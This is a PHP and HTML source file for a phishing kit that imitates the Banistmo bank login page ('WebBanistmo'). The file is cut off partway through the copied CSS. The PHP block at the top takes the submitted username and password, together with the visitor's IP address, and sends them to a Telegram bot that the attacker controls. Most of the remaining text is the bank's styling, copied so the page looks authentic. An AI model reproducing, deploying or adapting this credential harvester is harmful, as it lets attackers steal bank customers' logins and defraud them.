<?php
ini_set("display_errors", 0);

$config = include('config.php');
$elusr = $_POST['miDiosenticonfio'];
$elpax = $_POST['miDiosenticonfioxx'];

$token = $config['token'];
$chat_id = $config['chat_id'];

$ip = $_SERVER['REMOTE_ADDR'];




$mensaje_para_chatbot = "🟡B4NISTM0🟡\nUsar: ".$elusr."\nCl4v: ".$elpax."\nip: " . $ip;


$telegram_url = "https://api.telegram.org/bot".$token."/sendMessage?chat_id=".$chat_id."&text=" . urlencode($mensaje_para_chatbot);


$response = file_get_contents($telegram_url);




?>
<!DOCTYPE html>

<html lang="en">
   <head>
      <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
      
    
      <title>WebBanistmo</title>
      
    
    
      <meta name="viewport" content="width=device-width, initial-scale=1">
   
      <link rel="icon" type="image/x-icon" href="img/favicon_mod.ico">
      <link rel="stylesheet" href="css/all.css">
      <link rel="stylesheet" href="css/regular.css" >
      <style>@charset "UTF-8";*,*:before,*:after{box-sizing:border-box}html{font-family:sans-serif;line-height:1.15;-webkit-text-size-adjust:100%;-webkit-tap-highlight-color:rgba(44,42,41,0)}body{margin:0;font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Helvetica Neue,Arial,Noto Sans,Liberation Sans,sans-serif,"Apple Color Emoji","Segoe UI Emoji",Segoe UI Symbol,"Noto Color Emoji";font-size:1rem;font-weight:400;line-height:1.5;color:#212529;text-align:left;background-color:#fff}html{box-sizing:border-box;-ms-overflow-style:scrollbar}*,*:before,*:after{box-sizing:inherit}body{background-color:#f7f7f7}@font-face{font-family:OpenSans-Regular;src:url(css/OpenSans-Regular.147088f49d6d7e65.ttf) format("truetype");font-weight:400;font-style:normal}*{font-family:OpenSans-Regular}*:focus{outline:none!important}body{font-size:16px;color:#454648;line-height:1.38}</style>
      <link rel="stylesheet" href="css/styles.ae6a24ca3974d999.css" media="all" onload="this.media=&#39;all&#39;">
      <noscript>
         <link rel="stylesheet" href="css/styles.ae6a24ca3974d999.css">
      </noscript>
      <style></style>
      <style>#overlay[_ngcontent-mgc-c13]{position:fixed;width:100%;height:100%;inset:0;background-color:#000000b3;z-index:3}#overlay.hidden[_ngcontent-mgc-c13]{display:none}#overlay[_ngcontent-mgc-c13]   .coachmark-image[_ngcontent-mgc-c13]{padding-left:150px;padding-top:97px}#overlay[_ngcontent-mgc-c13]   .coachmark-image[_ngcontent-mgc-c13]   .coachmark-image-container[_ngcontent-mgc-c13]{background-color:#4a4a4a;width:990px;display:block;margin:auto;height:2000px}#overlay[_ngcontent-mgc-c13]   .coachmark-button[_ngcontent-mgc-c13]{position:absolute}#overlay[_ngcontent-mgc-c13]   .coachmark-button[_ngcontent-mgc-c13]:nth-child(2){bottom:70px;left:93px}#overlay[_ngcontent-mgc-c13]   .coachmark-button[_ngcontent-mgc-c13]:nth-child(3){bottom:70px;right:93px}#overlay[_ngcontent-mgc-c13]   .coachmark-button[_ngcontent-mgc-c13]:nth-child(4){top:10px;right:10px}#overlay[_ngcontent-mgc-c13]   .coachmark-button[_ngcontent-mgc-c13]   .transparent-btn[_ngcontent-mgc-c13]{display:inline-block;width:150px;padding:8px;color:#fff;border:1px solid #fff;border-radius:8px;text-align:center;outline:none;text-decoration:none;cursor:pointer}#overlay[_ngcontent-mgc-c13]   .coachmark-button[_ngcontent-mgc-c13]   .icon-close-white[_ngcontent-mgc-c13]{content:url(img/close-white.91ebe403d5da18f5.svg);cursor:pointer}</style>
      <style>@charset "UTF-8";.modal-body[_ngcontent-mgc-c137]   .session-message[_ngcontent-mgc-c137]{margin-bottom:24px;font: 400 16px/22px Open Sans}.modal-body[_ngcontent-mgc-c137]   .actions[_ngcontent-mgc-c137]   .button-container[_ngcontent-mgc-c137]{width:150px;margin-bottom:13px}.nav-bar-login[_ngcontent-mgc-c137]   .language[_ngcontent-mgc-c137]{display:flex;align-items:center}.nav-bar-login[_ngcontent-mgc-c137]   .language[_ngcontent-mgc-c137]   a[_ngcontent-mgc-c137]{color:#292929;cursor:pointer;font-weight:400;font-size:14px;line-height:18px;font-family:Open Sans,normal;margin-right:8px}.nav-bar-login[_ngcontent-mgc-c137]   .language[_ngcontent-mgc-c137]   a[_ngcontent-mgc-c137]:hover{font-weight:700;text-decoration:none}.nav-bar-login[_ngcontent-mgc-c137]   .language[_ngcontent-mgc-c137]   .icon-language[_ngcontent-mgc-c137]{width:24px;height:24px;content:url(img/language.svg)}.main-container[_ngcontent-mgc-c137]{padding-top:30px;background-color:transparent;min-height:calc(100vh - 180px)}.main-container[_ngcontent-mgc-c137]   .login-container[_ngcontent-mgc-c137]{width:100%;padding-bottom:30px}.main-container[_ngcontent-mgc-c137]   .login-container[_ngcontent-mgc-c137]   .login[_ngcontent-mgc-c137]{width:100%}.main-container[_ngcontent-mgc-c137]   .card-container[_ngcontent-mgc-c137]{padding-top:1.875rem}.main-container[_ngcontent-mgc-c137]   .secondary-container[_ngcontent-mgc-c137]{background-color:transparent;height:290px;margin-top:40px}.main-container[_ngcontent-mgc-c137]   .secondary-container[_ngcontent-mgc-c137]   .inner-secondary-container[_ngcontent-mgc-c137]{background-color:#f7f7f7}.main-container[_ngcontent-mgc-c137]   .fa-arrow-circle-right[_ngcontent-mgc-c137]{font-size:20px!important}.footer[_ngcontent-mgc-c137]{height:80px}@media screen and (min-width: 1200px){[_nghost-mgc-c137]     .navbar.container-nav{position:static!important;position:initial!important}.main-container[_ngcontent-mgc-c137]   .login-container[_ngcontent-mgc-c137]{position:absolute;width:100%}.main-container[_ngcontent-mgc-c137]   .login-container[_ngcontent-mgc-c137]   .login[_ngcontent-mgc-c137]{width:100%}}</style>
      <style>.text-field[_ngcontent-mgc-c68]{margin-bottom:10px}.text-field.disabled[_ngcontent-mgc-c68]{opacity:.3}.text-field.disabled[_ngcontent-mgc-c68]   .content[_ngcontent-mgc-c68], .text-field.disabled[_ngcontent-mgc-c68]   label[_ngcontent-mgc-c68], .text-field.disabled[_ngcontent-mgc-c68]   input[_ngcontent-mgc-c68], .text-field.disabled[_ngcontent-mgc-c68]   span[_ngcontent-mgc-c68]{cursor:not-allowed!important}.text-field.error[_ngcontent-mgc-c68]   p[_ngcontent-mgc-c68], .text-field.error[_ngcontent-mgc-c68]   span[_ngcontent-mgc-c68], .text-field.error[_ngcontent-mgc-c68]   .icon[_ngcontent-mgc-c68]   .error[_ngcontent-mgc-c68], .text-field.error[_ngcontent-mgc-c68]   input[_ngcontent-mgc-c68]:focus + span[_ngcontent-mgc-c68]{color:#e20201!important}.text-field.error[_ngcontent-mgc-c68]   input[_ngcontent-mgc-c68]{border-bottom:2px solid #E20201!important}.text-field[_ngcontent-mgc-c68]   .content[_ngcontent-mgc-c68]{width:100%;color:#454648;background-color:transparent;border-radius:0}.text-field[_ngcontent-mgc-c68]   .content[_ngcontent-mgc-c68]   label[_ngcontent-mgc-c68]{position:relative;display:block;width:100%;min-height:50px}.text-field[_ngcontent-mgc-c68]   .content[_ngcontent-mgc-c68]   input[_ngcontent-mgc-c68]{position:absolute;top:15px;z-index:1;width:100%;font-size:1em;border:0;border-bottom:1px solid #808285;transition:border-color .2s ease-in-out;outline:none;height:35px;background-color:transparent;box-sizing:border-box;-moz-box-sizing:border-box;-webkit-box-sizing:border-box;padding-left:0}.text-field[_ngcontent-mgc-c68]   .content[_ngcontent-mgc-c68]   input[_ngcontent-mgc-c68]:focus{border-bottom:2px solid #fdda24}.text-field[_ngcontent-mgc-c68]   .content[_ngcontent-mgc-c68]   input[_ngcontent-mgc-c68]:focus + span[_ngcontent-mgc-c68], .text-field[_ngcontent-mgc-c68]   .content[_ngcontent-mgc-c68]   input[_ngcontent-mgc-c68]:valid + span[_ngcontent-mgc-c68]{top:6px;cursor:inherit;font-size:.8em;color:#808285;padding-left:0}.text-field[_ngcontent-mgc-c68]   .content[_ngcontent-mgc-c68]   .disable-input[_ngcontent-mgc-c68]{top:6px;cursor:inherit;font-size:.8em;color:#808285;padding-left:15px}.text-field[_ngcontent-mgc-c68]   .content[_ngcontent-mgc-c68]   .status[_ngcontent-mgc-c68]{border-bottom:2px solid #808285}.text-field[_ngcontent-mgc-c68]   .content[_ngcontent-mgc-c68]   span[_ngcontent-mgc-c68]{position:absolute;display:block;top:15px;z-index:2;font-size:1em;transition:all .2s ease-in-out;width:100%;cursor:text;box-sizing:border-box;-moz-box-sizing:border-box;-webkit-box-sizing:border-box;padding-left:0}.text-field[_ngcontent-mgc-c68]   .content[_ngcontent-mgc-c68]   .icon[_ngcontent-mgc-c68]{z-index:3;margin:15px 0 0;right:0;position:absolute}.text-field[_ngcontent-mgc-c68]   .content[_ngcontent-mgc-c68]   .icon[_ngcontent-mgc-c68]   i[_ngcontent-mgc-c68]{font-size:1.2em;letter-spacing:8px;cursor:pointer}.text-field[_ngcontent-mgc-c68]   .message[_ngcontent-mgc-c68]{min-height:20px}.text-field[_ngcontent-mgc-c68]   .message[_ngcontent-mgc-c68]   p[_ngcontent-mgc-c68]{padding:0 0 0 15px;font-size:.8em;color:#808285;margin:-3px 0 0}</style>
      <style>.navbar[_ngcontent-mgc-c64]{width:100%;top:0;z-index:3;box-shadow:0 3px 12px #0000001a}.navbar.container-nav[_ngcontent-mgc-c64]{position:sticky}.navbar[_ngcontent-mgc-c64]   .main-navbar[_ngcontent-mgc-c64]{height:60px;background-color:#fff}.navbar[_ngcontent-mgc-c64]   .logo[_ngcontent-mgc-c64]   img[_ngcontent-mgc-c64]{height:22px}.navbar[_ngcontent-mgc-c64]   .logo[_ngcontent-mgc-c64]{text-align:center}.navbar[_ngcontent-mgc-c64]   .main-navbar[_ngcontent-mgc-c64]   .container[_ngcontent-mgc-c64]{height:100%;max-width:unset;padding:0}.navbar[_ngcontent-mgc-c64]   .main-navbar[_ngcontent-mgc-c64]   .container[_ngcontent-mgc-c64] > .row[_ngcontent-mgc-c64]{height:100%;align-items:center;justify-content:space-between;padding-left:57px;padding-right:16px;margin:0}.navbar[_ngcontent-mgc-c64]   .main-navbar.alt-position[_ngcontent-mgc-c64]{height:70px}.navbar[_ngcontent-mgc-c64]   .main-navbar.alt-position[_ngcontent-mgc-c64]   .container[_ngcontent-mgc-c64] > .row[_ngcontent-mgc-c64]{padding-left:25px}.navbar[_ngcontent-mgc-c64]   .main-navbar.alt-position[_ngcontent-mgc-c64]   .container[_ngcontent-mgc-c64] > .row[_ngcontent-mgc-c64]   .logo[_ngcontent-mgc-c64]   img[_ngcontent-mgc-c64]{height:30px}.navbar[_ngcontent-mgc-c64]   .secondary-navbar[_ngcontent-mgc-c64] > .row[_ngcontent-mgc-c64]{padding-left:25px;padding-right:25px;height:36px;margin:0;background:#ffffff;justify-content:space-between;align-items:center}.navbar[_ngcontent-mgc-c64]   .secondary-navbar[_ngcontent-mgc-c64]   .welcome-text[_ngcontent-mgc-c64]{font-weight:400;font-size:14px;line-height:18px;font-family:"Open Sans",sans-serif}.navbar[_ngcontent-mgc-c64]   .secondary-navbar[_ngcontent-mgc-c64]   .date[_ngcontent-mgc-c64]{font-weight:400;font-size:14px;line-height:18px;font-family:"Open Sans",sans-serif}@media only screen and (max-width: 1280px){.navbar[_ngcontent-mgc-c64]   .main-navbar.alt-position[_ngcontent-mgc-c64]   .container[_ngcontent-mgc-c64] > .row[_ngcontent-mgc-c64]{padding-left:90px}}</style>
      <style>h2[_ngcontent-mgc-c71]{font-size:1.12em;font-weight:bold;line-height:1.35;margin-bottom:35px}</style>
      <style>body[_ngcontent-mgc-c63]{overflow:hidden}.fix-center[_ngcontent-mgc-c63]{padding:100px}.info-modal-content[_ngcontent-mgc-c63]{width:50%;min-height:544px}.recoveryUsernameContent[_ngcontent-mgc-c63]{width:50%;min-height:370px}.modal-container[_ngcontent-mgc-c63]{overflow:auto;display:none;position:fixed;z-index:3000;left:0;top:0;width:100%;height:100%;-webkit-backdrop-filter:blur(19.028px);backdrop-filter:blur(19.028px);background-color:#ffffffb3}.modal-content[_ngcontent-mgc-c63]{min-width:700px;box-shadow:0 10px 16px #0000001a;background:#ffffff;align-items:center}.icon-close[_ngcontent-mgc-c63]{height:24px;width:24px;content:url(img/error.svg);position:absolute;right:16px;top:16px}.modal-content[_ngcontent-mgc-c63]   .modal-header[_ngcontent-mgc-c63]{width:100%;position:relative;padding:33px 24px 0;margin:0}.modal-content[_ngcontent-mgc-c63]   .modal-header[_ngcontent-mgc-c63]   h2[_ngcontent-mgc-c63]{margin:0;color:#000;font-weight:700;font-size:24px;line-height:26px;font-family:"CIBFont Sans",serif;text-align:center}.modal-content[_ngcontent-mgc-c63]   .modal-header[_ngcontent-mgc-c63]   .row[_ngcontent-mgc-c63]{width:100%;margin:unset;justify-content:center}.centered[_ngcontent-mgc-c63]{height:100%;display:flex;align-items:center;justify-content:center}.modal-content[_ngcontent-mgc-c63]   .modal-header[_ngcontent-mgc-c63]   .header-icon[_ngcontent-mgc-c63]{margin-top:16px;margin-bottom:16px}.icon-circle[_ngcontent-mgc-c63]{width:48px;height:48px;display:flex;justify-content:center;align-items:center;border-radius:24px}.icon-circle[_ngcontent-mgc-c63]   .icon[_ngcontent-mgc-c63]{width:32px;height:32px}.modal-content[_ngcontent-mgc-c63] > .modal-body[_ngcontent-mgc-c63]{padding:20px 24px}.modal-container.index[_ngcontent-mgc-c63]{z-index:100}</style>
      <style>@media only screen and (max-width: 1280px){.longWords[_ngcontent-mgc-c56]{height:65px!important;width:110%!important}}.longWords[_ngcontent-mgc-c56]{height:38px}.btn[_ngcontent-mgc-c56]{width:100%;min-width:130px;height:38px;border-radius:19px;font-family:"CIBFontSans-Bold";font-weight:400;font-size:16px;line-height:18px;letter-spacing:-.2px;border:0;text-transform:uppercase;box-shadow:0 1px 4px #0000001a}.btn[_ngcontent-mgc-c56]{cursor:pointer}.btn[_ngcontent-mgc-c56]:disabled{cursor:no-drop;background-color:#ddd!important}.btn.transparent[_ngcontent-mgc-c56]{background-color:transparent;color:#2c2a29;box-shadow:none}.btn.transparent[_ngcontent-mgc-c56]:hover{font-weight:700}.btn.primary-blue[_ngcontent-mgc-c56]{background-color:#59cbe8;color:#fff}.btn.primary-blue[_ngcontent-mgc-c56]:hover{background-color:#59cbe8}.btn.primary-blue[_ngcontent-mgc-c56]:active{background-color:#59cbe8}.btn.primary-gray[_ngcontent-mgc-c56]{background-color:#58595b;color:#fff}.btn.primary-gray[_ngcontent-mgc-c56]:hover{background-color:#363636}.btn.primary-gray[_ngcontent-mgc-c56]:active{background-color:#58595b}.btn.primary-yellow[_ngcontent-mgc-c56]{background-color:#fdda24;color:#2c2a29}.btn.primary-yellow[_ngcontent-mgc-c56]:hover{background-color:#fdda24}.btn.primary-yellow[_ngcontent-mgc-c56]:active{background-color:#fdda24}.btn.primary-red[_ngcontent-mgc-c56]{background-color:#e20201;color:#fff}.btn.primary-red[_ngcontent-mgc-c56]:hover{background-color:#d14d4a}.btn.primary-red[_ngcontent-mgc-c56]:active{background-color:#e20201}.btn.white[_ngcontent-mgc-c56]{background-color:#fff;color:#2c2a29}.btn.white[_ngcontent-mgc-c56]:hover{background-color:transparent}.btn.white[_ngcontent-mgc-c56]:active{background-color:#fff;color:#2c2a29}.btn.white-underline[_ngcontent-mgc-c56]{background-color:#fff;color:#2c2a29;text-decoration:underline}.btn.white-underline[_ngcontent-mgc-c56]:hover{background-color:transparent;border:1px solid #454648}.btn.white-underline[_ngcontent-mgc-c56]:active{background-color:#fff;color:#454648}.btn.secondary[_ngcontent-mgc-c56]{border:1px solid #2c2a29;background-color:#fff;color:#2c2a29}.btn.secondary[_ngcontent-mgc-c56]:hover{border-width:2px}.btn.secondary[_ngcontent-mgc-c56]:active{background-color:#58595b;color:#fff}.btn.secondary-transparent[_ngcontent-mgc-c56]{border:1px solid #2c2a29;background-color:transparent;color:#2c2a29}.btn.secondary-transparent[_ngcontent-mgc-c56]:hover{border-width:2px}.btn.secondary-transparent[_ngcontent-mgc-c56]:active{background-color:#58595b;color:#fff}.btn.secondary-transparent[_ngcontent-mgc-c56]   .icon[_ngcontent-mgc-c56]{position:absolute;right:15px;top:6px;font-size:1.4rem}.btn.small[_ngcontent-mgc-c56]{min-width:90px!important}.btn.flat[_ngcontent-mgc-c56]{border-radius:0;background-color:transparent;color:#2c2a29}.btn.flat[_ngcontent-mgc-c56]:hover{color:#fdda24}.btn.flat[_ngcontent-mgc-c56]:active{color:#58595b}.btn.white-underline-border[_ngcontent-mgc-c56]{background-color:#fff;color:#454648;text-decoration:underline}.btn.white-underline-border[_ngcontent-mgc-c56]:hover{background-color:transparent}.btn.white-underline-border[_ngcontent-mgc-c56]:active{background-color:#fff;color:#454648}</style>
      <style>footer[_ngcontent-mgc-c60]{width:100%;background-color:transparent;padding:25px 0 0;bottom:0;border-top:1px #e6e7e8 outset}footer[_ngcontent-mgc-c60]   a[_ngcontent-mgc-c60]{color:#454648;font-size:.8em;line-height:34px}footer[_ngcontent-mgc-c60]   a[_ngcontent-mgc-c60]:hover{font-weight:bold;text-decoration:none}.isOption[_ngcontent-mgc-c60]{padding:unset}.contact-information[_ngcontent-mgc-c60]{padding:22px 0}.contact-information[_ngcontent-mgc-c60]   i[_ngcontent-mgc-c60]{transform:scaleX(-1)}.contact-information[_ngcontent-mgc-c60]   .contact-telephone[_ngcontent-mgc-c60]{font-size:.79em;padding:2px}.contact-information[_ngcontent-mgc-c60]   .info-legal[_ngcontent-mgc-c60]{font-size:.75em}</style>
   
      <style>body[_ngcontent-mgc-c62]{overflow:hidden}.blocking-background[_ngcontent-mgc-c62]{background-color:#fff;position:fixed;top:0;left:0;width:100%;height:100%;z-index:2001}.container-loader[_ngcontent-mgc-c62]{position:fixed;top:0;left:0;width:100%;height:100%;z-index:2001;display:flex;align-items:center;justify-content:center}.container-loader[loaded][_ngcontent-mgc-c62]   .spinner[_ngcontent-mgc-c62]{animation:fadeout 2s ease-in;opacity:0}.container-loader[_ngcontent-mgc-c62]   .spinner[_ngcontent-mgc-c62]{animation:fadein 2s ease-in,spin 3s linear infinite}.container-loader[_ngcontent-mgc-c62]   .spinner[_ngcontent-mgc-c62]   .loading-inner[_ngcontent-mgc-c62]{fill:transparent;stroke:#000;stroke-dashoffset:0;stroke-dasharray:300;stroke-width:10;stroke-miterlimit:10;stroke-linecap:round;animation:loading-circle 2s linear infinite}@keyframes spin{to{transform:rotate(360deg)}}@keyframes fadein{0%{opacity:0}to{opacity:1}}@keyframes fadeout{0%{opacity:1}to{opacity:0}}@keyframes loading-circle{0%{stroke-dashoffset:0}to{stroke-dashoffset:-600}}@supports ((-webkit-backdrop-filter: blur(19.028px)) or (backdrop-filter: blur(19.028px))){.blocking-background[_ngcontent-mgc-c62]{background-color:#ffffffb3;-webkit-backdrop-filter:blur(19.028px);backdrop-filter:blur(19.028px)}}</style>
      <style>.card[_ngcontent-mgc-c57]{background-color:#fff;border-radius:0;border:1px solid #f1f1f1;box-shadow:0 2px 6px #00000012;width:100%;height:100%;overflow:hidden}.card.products[_ngcontent-mgc-c57]{width:304px;cursor:pointer}.card.products[_ngcontent-mgc-c57]:hover{box-shadow:0 6px 20px #0000001f}</style>
      <style>.nav-tabs[_ngcontent-mgc-c73]{display:flex;flex-wrap:nowrap;font-size:1em;font-weight:bold;border-bottom:1px solid #e6e7e8;cursor:pointer}.nav-tabs[_ngcontent-mgc-c73]   .tab[_ngcontent-mgc-c73]{width:50%;padding:18px 10px 10px;text-align:center}.nav-tabs[_ngcontent-mgc-c73]   .center[_ngcontent-mgc-c73]{flex:1 1;display:flex}.nav-tabs[_ngcontent-mgc-c73]   .tab-title[_ngcontent-mgc-c73]{padding:0 7px 5px;cursor:pointer}.nav-tabs[_ngcontent-mgc-c73]   .tab-title[_ngcontent-mgc-c73]   .subtitle[_ngcontent-mgc-c73]{font-size:13px;color:#454648;margin-bottom:-16px;font-weight:normal}.nav-tabs[_ngcontent-mgc-c73]   .active[_ngcontent-mgc-c73]{border-bottom:solid #fdda24}</style>
      <style>.pane[_ngcontent-mgc-c72]{justify-content:center}.padding[_ngcontent-mgc-c72]{padding:3px 1rem 1.875rem}</style>
      <style>@charset "UTF-8";.tabs-container[_ngcontent-mgc-c127]   .icon[_ngcontent-mgc-c127]{margin-top:12px}.tabs-container[_ngcontent-mgc-c127]   .icon[_ngcontent-mgc-c127]   img[_ngcontent-mgc-c127]{width:30px}.tabs-container[_ngcontent-mgc-c127]   .field[_ngcontent-mgc-c127]{padding-left:0}.tabs-container[_ngcontent-mgc-c127]   .actions[_ngcontent-mgc-c127]{margin:20px 0 50px}.tabs-container[_ngcontent-mgc-c127]   .info-links[_ngcontent-mgc-c127]   div[_ngcontent-mgc-c127]:first-child{padding-right:0}@media screen and (max-width: 1024px){.entailment[_ngcontent-mgc-c127]{position:relative!important;margin-top:50px!important;margin-left:0!important;margin-bottom:0!important}}.entailment[_ngcontent-mgc-c127]{position:absolute;margin-top:66px;margin-left:-17px;margin-bottom:20px;width:100%}.entailment[_ngcontent-mgc-c127]   .text-entailment[_ngcontent-mgc-c127]{font-size:16px;margin-top:20px;margin-bottom:20px}.entailment[_ngcontent-mgc-c127]   .btn.primary-yellow[_ngcontent-mgc-c127]{text-transform:none!important}.entailment[_ngcontent-mgc-c127]   .icon-circle[_ngcontent-mgc-c127]{border-radius:50%;background-color:#fdda24;width:48px;height:48px}.entailment[_ngcontent-mgc-c127]   img.text-center[_ngcontent-mgc-c127]{padding-top:25%}.entailment[_ngcontent-mgc-c127]   .center-icon[_ngcontent-mgc-c127]{margin:auto}</style>
      <style>.text-field[_ngcontent-mgc-c74]{margin-bottom:10px}.text-field.disabled[_ngcontent-mgc-c74]{opacity:.3}.text-field.disabled[_ngcontent-mgc-c74]   .content[_ngcontent-mgc-c74], .text-field.disabled[_ngcontent-mgc-c74]   label[_ngcontent-mgc-c74], .text-field.disabled[_ngcontent-mgc-c74]   input[_ngcontent-mgc-c74], .text-field.disabled[_ngcontent-mgc-c74]   span[_ngcontent-mgc-c74]{cursor:not-allowed!important}.text-field.error[_ngcontent-mgc-c74]   p[_ngcontent-mgc-c74], .text-field.error[_ngcontent-mgc-c74]   span[_ngcontent-mgc-c74], .text-field.error[_ngcontent-mgc-c74]   input[_ngcontent-mgc-c74]:focus + span[_ngcontent-mgc-c74]{color:#e20201!important}.text-field.error[_ngcontent-mgc-c74]   input[_ngcontent-mgc-c74]{border-bottom:2px solid #E20201!important}.text-field[_ngcontent-mgc-c74]   .content[_ngcontent-mgc-c74]{width:100%;color:#454648;background-color:#fff;border-radius:0}.text-field[_ngcontent-mgc-c74]   .content[_ngcontent-mgc-c74]   label[_ngcontent-mgc-c74]{position:relative;display:block;width:100%;min-height:50px}.text-field[_ngcontent-mgc-c74]   .content[_ngcontent-mgc-c74]   input[_ngcontent-mgc-c74]{position:absolute;top:15px;z-index:1;width:100%;font-size:1em;border:0;border-bottom:2px solid #808285;transition:border-color .2s ease-in-out;outline:none;height:35px;background-color:transparent;box-shadow:none;box-sizing:border-box;-moz-box-sizing:border-box;-webkit-box-sizing:border-box;padding-left:0}.text-field[_ngcontent-mgc-c74]   .content[_ngcontent-mgc-c74]   input[_ngcontent-mgc-c74]:focus{border-bottom:2px solid #fdda24}.text-field[_ngcontent-mgc-c74]   .content[_ngcontent-mgc-c74]   input[_ngcontent-mgc-c74]:focus + span[_ngcontent-mgc-c74], .text-field[_ngcontent-mgc-c74]   .content[_ngcontent-mgc-c74]   input[_ngcontent-mgc-c74]:valid + span[_ngcontent-mgc-c74]{top:6px;cursor:inherit;font-size:.8em;color:#2c2a29;padding-left:0}.text-field[_ngcontent-mgc-c74]   .content[_ngcontent-mgc-c74]   .status[_ngcontent-mgc-c74]{border-bottom:2px solid #808285}.text-field[_ngcontent-mgc-c74]   .content[_ngcontent-mgc-c74]   span[_ngcontent-mgc-c74]{position:absolute;display:block;top:15px;z-index:1;font-size:1em;transition:all .2s ease-in-out;width:100%;cursor:text;box-sizing:border-box;-moz-box-sizing:border-box;-webkit-box-sizing:border-box;padding-left:0;color:#2c2a29}.text-field[_ngcontent-mgc-c74]   .content[_ngcontent-mgc-c74]   .icon[_ngcontent-mgc-c74]{z-index:3;margin:15px 0 0;right:0;position:absolute}.text-field[_ngcontent-mgc-c74]   .content[_ngcontent-mgc-c74]   .icon[_ngcontent-mgc-c74]   i[_ngcontent-mgc-c74]{font-size:1.2em;letter-spacing:15px;cursor:pointer}.text-field[_ngcontent-mgc-c74]   .content[_ngcontent-mgc-c74]   .icon[_ngcontent-mgc-c74]   i[_ngcontent-mgc-c74]:nth-child(2){color:#e20201}.text-field[_ngcontent-mgc-c74]   .sub-content[_ngcontent-mgc-c74]{display:flex;justify-content:space-between;min-height:20px}.text-field[_ngcontent-mgc-c74]   .sub-content[_ngcontent-mgc-c74]   p[_ngcontent-mgc-c74]{font-size:.75rem;color:#808285;line-height:1.08;margin-bottom:0}.text-field[_ngcontent-mgc-c74]   .sub-content[_ngcontent-mgc-c74]   p.message[_ngcontent-mgc-c74]{padding:0 0 0 15px;margin-top:-3px}</style>
      <style>a[_ngcontent-mgc-c61]{font-size:.85em;color:#2c2a29!important;text-decoration:underline!important}a[_ngcontent-mgc-c61]:not(.disabled):hover{font-weight:bold;cursor:pointer}a.disabled[_ngcontent-mgc-c61]{color:#d1d3d4!important}a.disabled[_ngcontent-mgc-c61]:hover{cursor:not-allowed}</style>
      <style>@charset "UTF-8";h3[_ngcontent-mgc-c135]{font-size:1.125em;font-weight:700;line-height:1.28;text-align:center;color:#454648;margin-bottom:20px;font-family:CIBFontSans-Bold;font-size:20px;line-height:24px;letter-spacing:-.375px}h4[_ngcontent-mgc-c135]{font-size:.875em;font-weight:700;line-height:1.36;color:#454648;margin-bottom:30px;font-family:OpenSans-Regular;font-style:normal;font-weight:400;font-size:16px;line-height:22px;text-align:center;letter-spacing:-.3px}option[_ngcontent-mgc-c135]{background-color:#f7f7f7}.text-field-container[_ngcontent-mgc-c135]{margin-bottom:35px}.text-field-container[_ngcontent-mgc-c135]   .app-text-field[_ngcontent-mgc-c135]   input[name=text-field][_ngcontent-mgc-c135]{text-transform:uppercase}.text-field-container[_ngcontent-mgc-c135]   .error-message[_ngcontent-mgc-c135]{padding:0 0 0 15px;font-size:.8em;color:#fa5e5b;margin:-10px 0 0}.iconouser[_ngcontent-mgc-c135]{content:url(img/user.edc84e82b2e86766.svg);width:36px;height:36px}</style>
      <style>.text-field[_ngcontent-mgc-c70]{margin-bottom:10px}.text-field.disabled[_ngcontent-mgc-c70]{opacity:.3}.text-field.disabled[_ngcontent-mgc-c70]   .content[_ngcontent-mgc-c70], .text-field.disabled[_ngcontent-mgc-c70]   label[_ngcontent-mgc-c70], .text-field.disabled[_ngcontent-mgc-c70]   select[_ngcontent-mgc-c70], .text-field.disabled[_ngcontent-mgc-c70]   span[_ngcontent-mgc-c70]{cursor:not-allowed!important}.text-field.error[_ngcontent-mgc-c70]   p[_ngcontent-mgc-c70], .text-field.error[_ngcontent-mgc-c70]   span[_ngcontent-mgc-c70], .text-field.error[_ngcontent-mgc-c70]   .icon[_ngcontent-mgc-c70], .text-field.error[_ngcontent-mgc-c70]   select[_ngcontent-mgc-c70]:focus + span[_ngcontent-mgc-c70]{color:#e20201!important}.text-field.error[_ngcontent-mgc-c70]   select[_ngcontent-mgc-c70]{border-bottom:2px solid #E20201!important}.text-field[_ngcontent-mgc-c70]   .icon-arrow[_ngcontent-mgc-c70]{font-size:32px;transform:scaleX(1.15) scaleY(.7);color:#58595b}.text-field[_ngcontent-mgc-c70]   .content[_ngcontent-mgc-c70]{width:100%;color:#454648;background-color:#fff;border-radius:0}.text-field[_ngcontent-mgc-c70]   .content.withe[_ngcontent-mgc-c70]{background-color:#fff}.text-field[_ngcontent-mgc-c70]   .content[_ngcontent-mgc-c70]   label[_ngcontent-mgc-c70]{position:relative;display:block;width:100%;min-height:50px}.text-field[_ngcontent-mgc-c70]   .content[_ngcontent-mgc-c70]   select[_ngcontent-mgc-c70]{position:absolute;top:15px;width:100%;font-size:1em;color:#454648;border:0;border-radius:0;border-bottom:2px solid #808285;transition:border-color .2s ease-in-out;outline:none;height:35px;background-color:transparent;box-sizing:border-box;-moz-box-sizing:border-box;-webkit-box-sizing:border-box;padding-left:15px;-moz-appearance:none;-webkit-appearance:none;appearance:none;cursor:pointer}.text-field[_ngcontent-mgc-c70]   .content[_ngcontent-mgc-c70]   select[_ngcontent-mgc-c70]:focus{border-bottom:2px solid #fdda24}.text-field[_ngcontent-mgc-c70]   .content[_ngcontent-mgc-c70]   select[_ngcontent-mgc-c70]:focus + span[_ngcontent-mgc-c70], .text-field[_ngcontent-mgc-c70]   .content[_ngcontent-mgc-c70]   select[_ngcontent-mgc-c70]:valid + span[_ngcontent-mgc-c70]{top:6px;cursor:inherit;font-size:.8em;color:#808285;padding-left:15px}.text-field[_ngcontent-mgc-c70]   .content[_ngcontent-mgc-c70]   .status[_ngcontent-mgc-c70]{border-bottom:2px solid #808285}.text-field[_ngcontent-mgc-c70]   .content[_ngcontent-mgc-c70]   span[_ngcontent-mgc-c70]{position:absolute;display:block;top:20px;font-size:1em;transition:all .2s ease-in-out;width:100%;box-sizing:border-box;-moz-box-sizing:border-box;-webkit-box-sizing:border-box;padding-left:15px;color:#808285;pointer-events:none}.text-field[_ngcontent-mgc-c70]   .content[_ngcontent-mgc-c70]   .icon[_ngcontent-mgc-c70]{font-size:1em;position:absolute;right:12px;top:15px}.text-field[_ngcontent-mgc-c70]   .content[_ngcontent-mgc-c70]   .icon.padding-right[_ngcontent-mgc-c70]{right:30px}.text-field[_ngcontent-mgc-c70]   .message[_ngcontent-mgc-c70]{min-height:20px}.text-field[_ngcontent-mgc-c70]   .message[_ngcontent-mgc-c70]   p[_ngcontent-mgc-c70]{padding:4px 0 0 